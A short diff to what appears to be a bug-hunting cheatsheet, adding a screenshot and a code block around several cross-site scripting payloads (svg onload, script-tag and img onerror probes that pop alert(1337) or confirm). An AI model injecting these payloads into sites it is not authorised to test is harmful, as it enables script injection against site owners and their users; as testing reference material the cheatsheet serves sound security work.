@@ -5,6 +5,9 @@
 ![Screenshot from 2024-06-22 21-24-55](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/a4b3b27e-3e78-438e-90c1-38f3986f5a79)
 ```js
 <svg/ onload=alert(1337)//
+```
+![Screenshot from 2024-06-22 21-30-13](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/cd6ea4c0-17df-448a-bc1a-caa4d293ee80)
+```js
 <Svg/OnLoad=(confirm)(1337)<!--
 ">cyborg71<script>alert(1337)</script>
 <img src=x onerror=alert(1337)>
